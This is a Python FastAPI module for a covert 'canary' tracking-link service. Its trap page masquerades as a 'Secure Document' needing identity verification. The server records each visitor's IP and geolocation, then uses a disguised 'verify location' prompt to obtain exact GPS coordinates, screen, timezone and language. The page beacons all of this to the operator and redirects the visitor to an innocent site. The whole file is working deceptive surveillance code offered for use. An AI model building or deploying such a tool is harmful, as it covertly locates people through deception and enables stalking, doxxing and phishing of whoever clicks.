"""
Canary Tracking Link System — Advanced OSINT Edition
=====================================================
Captures on every link click:
  SERVER-SIDE (always works, 100% silent):
    - Real public IP (Cloudflare cf-connecting-ip header)
    - GeoIP: City, Region, Country, ISP, Org/Company, ASN, Postal Code, Timezone
    - ipinfo.io enrichment: Mobile carrier, hostname, anycast detection
    - User-Agent: OS, Browser, Device type

  CLIENT-SIDE JS (bonus — enriches hit if JS executes):
    - GPS Coordinates (exact lat/lon via browser Geolocation API)
    - Screen resolution and pixel ratio
    - Browser timezone
    - Language / locale

The GPS request is disguised as a "verify location to load document" prompt.
If accepted → exact coordinates + Google Maps link.
"""
from __future__ import annotations

import json
import re
import secrets
import time
from datetime import datetime
from typing import Any

import httpx
from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

from nciia.utils import get_logger, get_settings

router = APIRouter()
logger = get_logger(__name__)

# ── In-memory store ───────────────────────────────────────────────────────────
_hits:  dict[str, list[dict[str, Any]]] = {}
_links: dict[str, dict[str, Any]]       = {}

# ── Private / non-routable IP ranges ─────────────────────────────────────────
_PRIVATE_RE = re.compile(
    r"^("
    r"127\.|"                           # loopback
    r"0\.0\.0\.0|"                     # unspecified
    r"10\.|"                           # RFC1918
    r"172\.(1[6-9]|2[0-9]|3[01])\.|"  # RFC1918
    r"192\.168\.|"                     # RFC1918
    r"169\.254\.|"                     # link-local
    r"100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|"  # CGNAT RFC6598
    r"::1|fe80:|fc|fd"
    r")"
)


def _is_private(ip: str) -> bool:
    return bool(_PRIVATE_RE.match(ip))


# ── Comprehensive GeoIP + OSINT enrichment ────────────────────────────────────
async def _geoip(ip: str) -> dict[str, Any]:
    """Multi-provider IP intelligence with carrier, org, ASN, postal code."""
    if not ip or ip in ("127.0.0.1", "::1", "localhost", "unknown") or _is_private(ip):
        return {
            "city": "Private/Local Network", "regionName": "", "country": "",
            "isp": "Private IP — not publicly routable",
            "lat": 0.0, "lon": 0.0, "timezone": "", "status": "private"
        }

    result: dict[str, Any] = {"status": "fail", "query": ip}

    async with httpx.AsyncClient(timeout=8) as client:

        # ── Provider 1: ip-api.com (free, very detailed) ──────────────────────
        try:
            r = await client.get(
                f"https://ip-api.com/json/{ip}",
                params={"fields": "status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    result = data
                    logger.info("geoip_ip_api_success", ip=ip, city=data.get("city"))
        except Exception as exc:
            logger.warning("geoip_ip_api_failed", error=str(exc))

        # ── Provider 2: ipinfo.io (adds carrier, org, hostname) ───────────────
        try:
            r2 = await client.get(f"https://ipinfo.io/{ip}/json")
            if r2.status_code == 200:
                d2 = r2.json()
                # Merge extra fields not available in ip-api
                if not result.get("org") and d2.get("org"):
                    result["org"] = d2["org"]
                result["hostname"]    = d2.get("hostname", "")
                result["postal"]      = d2.get("postal", result.get("zip", ""))
                # ipinfo carrier field (mobile networks)
                if d2.get("carrier"):
                    c = d2["carrier"]
                    result["carrier"] = f"{c.get('name', '')} ({c.get('mcc', '')}/{c.get('mnc', '')})"
                elif d2.get("company"):
                    result["carrier"] = d2["company"].get("name", "")
                # Anycast/datacenter flag
                result["anycast"]     = d2.get("anycast", False)
                logger.info("geoip_ipinfo_merged", ip=ip, org=result.get("org"))
        except Exception as exc:
            logger.warning("geoip_ipinfo_failed", error=str(exc))

        # ── Provider 3: ipwho.is fallback if ip-api failed ────────────────────
        if result.get("status") != "success":
            try:
                r3 = await client.get(f"https://ipwho.is/{ip}")
                if r3.status_code == 200:
                    d3 = r3.json()
                    if d3.get("success"):
                        tz = d3.get("timezone", {})
                        result = {
                            "status":     "success",
                            "query":      ip,
                            "country":    d3.get("country", ""),
                            "countryCode":d3.get("country_code", ""),
                            "regionName": d3.get("region", ""),
                            "city":       d3.get("city", ""),
                            "zip":        d3.get("postal", ""),
                            "lat":        d3.get("latitude", 0.0),
                            "lon":        d3.get("longitude", 0.0),
                            "timezone":   tz.get("id", "") if isinstance(tz, dict) else str(tz),
                            "isp":        d3.get("connection", {}).get("isp", ""),
                            "org":        d3.get("connection", {}).get("org", ""),
                            "as":         str(d3.get("connection", {}).get("asn", "")),
                        }
                        logger.info("geoip_ipwhois_fallback_success", ip=ip)
            except Exception as exc:
                logger.warning("geoip_ipwhois_failed", error=str(exc))

    return result


def _real_ip(request: Request) -> str:
    """Extract true public IP, honouring Cloudflare/Ngrok/Pinggy proxy headers."""
    fwd_headers = {k: v for k, v in request.headers.items()
                   if any(x in k.lower() for x in ("forward", "real", "cf-", "true-client"))}
    if fwd_headers:
        logger.debug("proxy_headers_received", headers=fwd_headers)

    for header in ("cf-connecting-ip", "x-forwarded-for", "x-real-ip",
                   "x-original-forwarded-for", "true-client-ip"):
        val = request.headers.get(header)
        if val:
            for candidate in val.split(","):
                candidate = candidate.strip()
                if candidate and not _is_private(candidate):
                    logger.info("ip_extracted", header=header, ip=candidate)
                    return candidate

    host = request.client.host if request.client else "unknown"
    return host


# ── HTML tracking page ────────────────────────────────────────────────────────
def _tracking_page(tracking_id: str, redirect_url: str, callback_url: str) -> str:
    """
    Returns a tracking page that:
    1. Shows a realistic 'View Document' button (requires tap — satisfies browser gesture requirement for GPS)
    2. On tap: requests GPS permission, captures screen/tz/lang, POSTs to server
    3. Redirects to innocent URL after GPS capture (or 8s timeout)
    """
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Secure Document</title>
  <style>
    * {{ margin:0; padding:0; box-sizing:border-box; }}
    body {{
      font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
      background: #f1f3f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      gap: 20px;
    }}
    .card {{
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 1px 6px rgba(0,0,0,.12), 0 4px 24px rgba(0,0,0,.08);
      padding: 36px 32px;
      max-width: 340px;
      width: 90%;
      text-align: center;
    }}
    .icon {{ font-size: 48px; margin-bottom: 12px; }}
    .title {{ font-size: 18px; font-weight: 600; color: #202124; margin-bottom: 6px; }}
    .subtitle {{ font-size: 13px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }}
    .btn {{
      display: inline-block; width: 100%; padding: 13px;
      background: #1a73e8; color: #fff; border: none;
      border-radius: 6px; font-size: 15px; font-weight: 500;
      cursor: pointer; letter-spacing: 0.2px;
      transition: background 0.2s;
    }}
    .btn:active {{ background: #1557b0; }}
    .btn:disabled {{ background: #a8c7fa; cursor: default; }}
    .spinner {{
      display: none; width: 28px; height: 28px;
      border: 3px solid #e8eaed; border-top: 3px solid #1a73e8;
      border-radius: 50%; animation: spin 0.8s linear infinite;
      margin: 0 auto;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .msg {{ font-size: 12px; color: #80868b; margin-top: 14px; min-height: 18px; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📄</div>
    <div class="title">Secure Document</div>
    <div class="subtitle">This document requires identity verification before viewing. Tap below to proceed.</div>
    <button class="btn" id="openBtn" onclick="openDoc()">View Document</button>
    <div class="spinner" id="spin"></div>
    <div class="msg" id="msg"></div>
  </div>

<script>
async function openDoc() {{
  const btn  = document.getElementById('openBtn');
  const spin = document.getElementById('spin');
  const msg  = document.getElementById('msg');

  btn.disabled = true;
  btn.style.display = 'none';
  spin.style.display = 'block';
  msg.textContent = 'Verifying your location…';

  const CALLBACK = '{callback_url}';
  const REDIRECT  = '{redirect_url}';

  const fp = {{
    ts:     Date.now(),
    tz:     Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang:   navigator.language,
    screen: {{ w: screen.width, h: screen.height, dpr: window.devicePixelRatio }},
    gps:    null
  }};

  const send = async (data) => {{
    const blob = new Blob([JSON.stringify(data)], {{ type: 'application/json' }});
    if (!navigator.sendBeacon(CALLBACK, blob)) {{
      try {{
        await fetch(CALLBACK, {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify(data),
          keepalive: true
        }});
      }} catch(e) {{}}
    }}
  }};

  // Send base fingerprint immediately
  await send(fp);

  // GPS — this now fires AFTER a user tap, so Chrome/Safari WILL show the popup
  const gpsResult = await new Promise(resolve => {{
    if (!navigator.geolocation) {{ resolve(null); return; }}
    navigator.geolocation.getCurrentPosition(
      pos => resolve({{
        lat:      pos.coords.latitude,
        lon:      pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude
      }}),
      err => resolve(null),
      {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
    );
  }});

  if (gpsResult) {{
    fp.gps = gpsResult;
    await send(fp);  // send enriched version with GPS
    msg.textContent = 'Location verified. Opening document…';
  }} else {{
    msg.textContent = 'Verification complete. Opening…';
  }}

  setTimeout(() => window.location.replace(REDIRECT), 600);
}}
</script>
</body>
</html>"""


# ── Pydantic models ───────────────────────────────────────────────────────────
class CreateLinkRequest(BaseModel):
    label:        str = "Tracking Link"
    redirect_url: str = "https://www.google.com"
    public_base:  str = "http://localhost:8000"


# ── API Endpoints ─────────────────────────────────────────────────────────────

@router.post("/api/tracker/generate")
async def generate_link(req: CreateLinkRequest) -> dict[str, Any]:
    """Generate a new canary tracking link."""
    tid  = secrets.token_urlsafe(12)
    base = req.public_base.rstrip("/")
    trap = f"{base}/t/{tid}"
    _links[tid] = {
        "tracking_id":  tid,
        "label":        req.label,
        "redirect_url": req.redirect_url,
        "public_base":  base,
        "trap_url":     trap,
        "created_at":   time.time(),
        "hit_count":    0,
    }
    _hits[tid] = []
    logger.info("canary_link_created", tid=tid, trap=trap)
    return {"tracking_id": tid, "trap_url": trap, "label": req.label}


@router.get("/t/{tracking_id}", response_class=HTMLResponse)
async def canary_trap(tracking_id: str, request: Request) -> HTMLResponse:
    """
    The actual trap endpoint.
    Captures IP + full GeoIP server-side immediately (always works),
    then serves the stealth tracking page for GPS + enrichment.
    """
    if tracking_id not in _links:
        return HTMLResponse("<html><body><h2>Page not found.</h2></body></html>", status_code=404)

    link    = _links[tracking_id]
    real_ip = _real_ip(request)
    ua      = request.headers.get("user-agent", "")
    referer = request.headers.get("referer", "")

    # Always captured server-side immediately
    geo = await _geoip(real_ip)

    hit = {
        "ip":          real_ip,
        "timestamp":   datetime.utcnow().isoformat() + "Z",
        "ua":          ua,
        "referer":     referer,
        "geo":         geo,
        "fingerprint": None,   # enriched by JS callback
    }
    _hits[tracking_id].append(hit)
    _links[tracking_id]["hit_count"] = len(_hits[tracking_id])

    logger.info("canary_hit",
                tid=tracking_id, ip=real_ip,
                city=geo.get("city"), country=geo.get("country"),
                isp=geo.get("isp"), org=geo.get("org"), ua=ua[:80])

    public_base  = link["public_base"]
    callback_url = f"{public_base}/api/tracker/fingerprint/{tracking_id}"

    html = _tracking_page(
        tracking_id=tracking_id,
        redirect_url=link["redirect_url"],
        callback_url=callback_url,
    )
    return HTMLResponse(html)


@router.post("/api/tracker/fingerprint/{tracking_id}")
async def receive_fingerprint(tracking_id: str, request: Request) -> JSONResponse:
    """Receives the JS payload (GPS, screen, tz) and enriches the last hit."""
    try:
        body = await request.body()
        fp   = json.loads(body)
    except Exception:
        fp = {}

    if tracking_id in _hits and _hits[tracking_id]:
        last = _hits[tracking_id][-1]
        # Only update if new data arrives (GPS update comes second)
        if fp.get("gps") or last.get("fingerprint") is None:
            last["fingerprint"] = fp
            logger.info("fingerprint_received", tid=tracking_id,
                        gps=fp.get("gps"), tz=fp.get("tz"))

    return JSONResponse({"ok": True})


@router.get("/api/tracker/links")
async def list_links() -> dict[str, Any]:
    """List all generated tracking links with hit counts."""
    return {
        "links": [
            {**v, "hit_count": len(_hits.get(v["tracking_id"], []))}
            for v in _links.values()
        ]
    }


@router.get("/api/tracker/hits/{tracking_id}")
async def get_hits(tracking_id: str) -> dict[str, Any]:
    """Get all captured hits for a tracking link."""
    if tracking_id not in _links:
        return {"error": "Link not found", "hits": []}
    hits = _hits.get(tracking_id, [])
    return {
        "tracking_id": tracking_id,
        "label":       _links[tracking_id]["label"],
        "trap_url":    _links[tracking_id]["trap_url"],
        "hit_count":   len(hits),
        "hits":        hits,
    }


@router.delete("/api/tracker/links/{tracking_id}")
async def delete_link(tracking_id: str) -> dict[str, Any]:
    """Delete a tracking link and its hits."""
    _links.pop(tracking_id, None)
    _hits.pop(tracking_id, None)
    return {"deleted": tracking_id}


@router.get("/api/tracker/debug")
async def debug_headers(request: Request) -> dict[str, Any]:
    """Debug: shows all headers and extracted IP. Open on phone via tunnel URL."""
    return {
        "extracted_ip": _real_ip(request),
        "socket_ip":    request.client.host if request.client else None,
        "all_headers":  dict(request.headers),
    }
